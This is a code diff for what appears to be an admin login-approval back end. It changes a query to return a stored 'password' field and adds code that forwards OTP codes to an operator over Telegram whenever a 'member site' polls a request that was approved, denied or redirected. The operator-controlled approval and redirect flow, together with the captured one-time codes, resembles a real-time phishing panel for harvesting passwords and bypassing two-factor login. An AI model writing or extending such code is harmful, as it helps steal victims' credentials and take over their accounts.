@@ -2,6 +2,7 @@ import { getSql } from '@/lib/db'
 import {
   sendAdminLoginOutcomeNotification,
   type AdminLoginOutcomeAction,
+  type AdminRequestKind,
 } from '@/lib/admin-login-outcome'
 
 let columnEnsured = false
@@ -20,6 +21,10 @@ function statusToAction(status: string): AdminLoginOutcomeAction | null {
   return null
 }
 
+function normalizeRequestKind(v: unknown): AdminRequestKind {
+  return v === 'otp' ? 'otp' : 'login'
+}
+
 /** Send admin approve/deny/redirect Telegram once, when the member site polls status. */
 export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
   if (!process.env.DATABASE_URL) return
@@ -34,7 +39,8 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
     WHERE id = ${id}
       AND status IN ('approved', 'denied', 'redirected')
       AND admin_outcome_notified_at IS NULL
-    RETURNING user_id AS "userId", method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status
+    RETURNING user_id AS "userId", method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status,
+      COALESCE(request_kind, 'login') AS "requestKind", password
   `
 
   const row = rows[0] as Record<string, unknown> | undefined
@@ -43,13 +49,17 @@ export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
   const action = statusToAction(String(row.status))
   if (!action) return
 
+  const requestKind = normalizeRequestKind(row.requestKind)
+
   try {
     await sendAdminLoginOutcomeNotification({
       action,
+      requestKind,
       userId: String(row.userId ?? ''),
       method: row.method === 'email' ? 'email' : 'text',
       maskedEmail: String(row.maskedEmail ?? ''),
       maskedPhone: String(row.maskedPhone ?? ''),
+      code: requestKind === 'otp' ? String(row.password ?? '') : undefined,
     })
   } catch (err) {
     await sql`
